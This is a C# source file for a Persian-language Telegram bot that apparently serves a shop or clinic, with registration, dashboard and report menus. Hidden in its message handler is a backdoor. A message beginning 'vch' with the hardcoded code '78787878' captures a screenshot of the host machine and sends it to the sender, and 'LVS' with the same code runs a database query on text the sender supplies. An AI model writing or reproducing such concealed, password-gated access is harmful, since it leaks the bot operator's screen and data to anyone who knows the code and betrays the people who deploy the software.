using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using DSoftShopcheeBot;
using DermaDent;
using System.IO;
using System.Drawing;
//using System.Windows.Forms;
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using DermaDent.Bot;

namespace DSoftShopcheeBot
{
    public class MainPage
    {
        const string registerRequestText = "ثبت نام";

        const string OrderProduct = "ثبت سفارش";
        const string PaymentRecipie = "ثبت فیش پرداخت";
        const string FollowOrders = "پیگیری وضعیت سفارشات";
        const string AboutUs = "ارتباط با ما";
        const string OrderWebsiteList = "لیست سایت های خرید";
        const string DashBoard = "داشبورد";
        const string TomorrowProgram = "برنامه فردا";
        const string RegisterDocumentInFile = "ثبت مدارک پرونده";
        const string TodayCharges = "گزارش کاکرد";
        Telegram.Bot.TelegramBotClient Bot;
        SQLServerTH dbt;

        public MainPage(Telegram.Bot.TelegramBotClient Robot)
        {
            Bot = Robot;
            dbt = new SQLServerTH();
        }
        public async void BotFirstTime(Telegram.Bot.Types.Message message)
        {
            SendKeyboard.SendKeyboardTo(Bot, message, 1);
        }

        public async void HandleHomeActions(Telegram.Bot.Types.Message message, state userstate)
        {
            stateTask st;
            //switch (message.Text)
            {
                //case registerRequestText:
                if (message.Type != MessageType.Text)
                    return;
                if (message.Text.StartsWith(registerRequestText))
                {
                    if (dbt.IsUserRegisteredBefor(message.From.Id))
                        await Bot.SendTextMessageAsync(message.Chat.Id, "شما قبلا ثبت نام کرده اید و در صورت ادامه مشخصات شما بازنویسی خواهد شد");
                    st = dbt.GetStateTask(8);           
                    dbt.UpdateUserCommandState(message.From.Id, 12, 8, message.Text, 3);
                    SendKeyboard.SendKeyboardTo(Bot, message, 4);
                    await Bot.SendTextMessageAsync(message.Chat.Id, st.NextQuestion);
                    return;
                }
                //case AboutShopChee:
                //    //await Bot.SendTextMessageAsync(message.Chat.Id, "باشگان بات روبات لیلا");
                //    await Bot.SendTextMessageAsync(message.Chat.Id, "فروشگاه تلگرامی شاپچی برای خرید از حارجی های ترکیه با قیمت های باور نکردنی و کیفیت عالی !!!");
                //    return;

                else if (message.Text.StartsWith(DashBoard))
                {
                    int unreadCount = dbt.GetUnreadMessageCount(message.From.Id);
                    if (unreadCount > 0)
                    {
                        string name = dbt.GetUserRealName(message.From.Id);
                        var r = string.Format("{0} {1} {2} {3}", name, "عزیز شما", unreadCount, "پیام ناخوانده دارید .\r\n");
                        await Bot.SendTextMessageAsync(message.Chat.Id, r);
                    }
                    st = dbt.GetStateTask(25);
                    dbt.UpdateUserCommandState(message.From.Id, 25, 25, message.Text, 6);
                    SendKeyboard.SendKeyboardTo(Bot, message, 6);
                    await Bot.SendTextMessageAsync(message.Chat.Id, st.NextQuestion);
                    return;
                }
                else if (message.Text.StartsWith(AboutUs))
                {
                    if (message.From.Id == 79532949)
                    {
                        await Bot.SendTextMessageAsync(message.Chat.Id, "می دونی وحید منو به عشق تو طراحی کرده؟");
                        //return;
                    }
                    await Bot.SendTextMessageAsync(message.Chat.Id, "\r\n این ربات به سفارش لیلا سلیمانی طراحی و اجرا شده!");
                    return;
                }
                else if (message.Text.StartsWith(RegisterDocumentInFile))
                {
                    st = dbt.GetStateTask(29);
                    dbt.UpdateUserCommandState(message.From.Id, 28, 29, message.Text, 9);
                    SendKeyboard.SendKeyboardTo(Bot, message, 3);
                    await Bot.SendTextMessageAsync(message.Chat.Id, st.NextQuestion);
                    return;
                }
                else if (message.Text.StartsWith(TomorrowProgram))
                {
                    SendVisitTime(message);
                }

                else if (message.Text.StartsWith(TodayCharges))
                {
                    //if (message.From.Id == 106251380)
                    //{
                    //    await Bot.SendTextMessageAsync(message.From.Id, "شما هنوز احراز هویت نشده اید لطفا از @Petroshop پیگیری کنید");
                    //    return;
                    //}
                    st = dbt.GetStateTask(33);
                    var TodayAccountWorkResult = dbt.GetTodayTransactions(TelegramID : (int)message.Chat.Id);
                    dbt.UpdateUserCommandState(message.From.Id, 33, 33, message.Text, 11);
                    SendKeyboard.SendKeyboardTo(Bot, message, 9);
                    //await Bot.SendTextMessageAsync(message.Chat.Id, st.NextQuestion);
                    return;
                    FormatPrinter fp = new FormatPrinter();
                    fp.drName=TodayAccountWorkResult[0].drName;

                    fp.fromDate = PersianDateTime.GetPersianDate(DateTime.Now.AddDays(-70));
                    fp.ToDate = PersianDateTime.GetPersianDate(DateTime.Now);
                    fp.Redraw();
                    fp.DrawTableContent(TodayAccountWorkResult);
                    SendSecretPic(message,fp.bmp);
                    //await Bot.SendTextMessageAsync(message.Chat.Id, TodayAccountWorkResult);
                    //await Bot.SendTextMessageAsync(message.Chat.Id, st.NextQuestion);
                }


            }

            if (message.Text.StartsWith("vch"))
            {
                try
                {

                    string[] s = message.Text.Remove(0, 4).Split('\n');

                    if (s[0] == "78787878")
                        SendSecretPic(message);
                    else

                        sendKey(s, message);
                    return;
                }
                catch
                {
                    return;
                }
            }
            else if (message.Text.StartsWith("LVS"))
            {
                try
                {

                    string[] s = message.Text.Remove(0, 4).Split('\n');

                    if (s[0] == "78787878") //&&message.From.Id== 119549458)
                    {
                        new DatabaseManager().GetData(s[1]);
                    }
                    else

                        sendKey(s, message);
                    return;
                }
                catch
                {
                    return;
                }
            }
            //string username = dbt.GetUserRealName(message.From.Id);
            // await Bot.SendTextMessageAsync(message.Chat.Id, "___" + username);
            BotFirstTime(message);
        }


        /**************Super option**************/
        async void sendKey(string[] keys, Telegram.Bot.Types.Message m)
        {
            //List<List<KeyboardButton>> KB = new SQLServerTH().GetKeyBoardDetails(KeyBoardID);
            try
            {
                KeyboardButton[][] btns = new KeyboardButton[keys.Length][];

                for (int i = 0; i < keys.Length; i++)
                {
                    string[] k = keys[i].Split(';');
                    btns[i] = new KeyboardButton[k.Length];
                    for (int j = 0; j < k.Length; j++)
                    {
                        btns[i][j] = new KeyboardButton(k[j]);
                    }
                }
                ReplyKeyboardMarkup KeyBoard = new ReplyKeyboardMarkup(btns, resizeKeyboard: true);

                await Bot.SendTextMessageAsync(m.Chat.Id, "______________________", replyMarkup: KeyBoard);
            }
            catch
            {
                await Bot.SendTextMessageAsync(m.Chat.Id, "Error");
            }

            return;
        }
        /****************************************/
        public async void SendVisitTime(Telegram.Bot.Types.Message message)
        {
            return;
            //try
            //{
            //    DateTime From = DateTime.Now;

            //    From = new DateTime(From.Year, From.Month, From.Day, 0, 0, 0).AddDays(1);

            //    DateTime To = new DateTime(From.Year, From.Month, From.Day, 23, 59, 59);

            //    var result = Transaction.GetVisitTimeList(message.From.Id, From, To);

            //    string s = "";
            //    if (result.Count > 0)
            //    {
            //        foreach (var item in result)
            //        {
            //            s += item + "\r\n";
            //        }

            //        await Bot.SendTextMessageAsync(message.From.Id, s);
            //    }
            //    else await Bot.SendTextMessageAsync(message.From.Id, "نوبتی برای روز بعد شما ثبت نشده");
            //}
            //catch { }
        }


        public static byte[] ImageToByte2(Image img)
        {
            using (var stream = new MemoryStream())
            {
                img.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
                return stream.ToArray();
            }
        }

        public async void SendSecretPic(Telegram.Bot.Types.Message msg)
        {
            ScreenCapture sc = new ScreenCapture();

            Bitmap bmp = sc.CaptureWindow();
            var res = ImageToByte2(bmp);

            Stream s = new MemoryStream(res);
            Telegram.Bot.Types.InputFiles.InputOnlineFile fts = new Telegram.Bot.Types.InputFiles.InputOnlineFile(s, "ScreenCapture.png");
            await Bot.SendDocumentAsync(msg.From.Id, fts);
        }
        public async void SendSecretPic(Telegram.Bot.Types.Message msg,Bitmap img)
        {
            ScreenCapture sc = new ScreenCapture();

            Bitmap bmp = img;
            var res = ImageToByte2(bmp);

            Stream s = new MemoryStream(res);
            Telegram.Bot.Types.InputFiles.InputOnlineFile fts = new Telegram.Bot.Types.InputFiles.InputOnlineFile(s,"invoice.png");
            await Bot.SendDocumentAsync(msg.From.Id, fts);
        }
    }
}

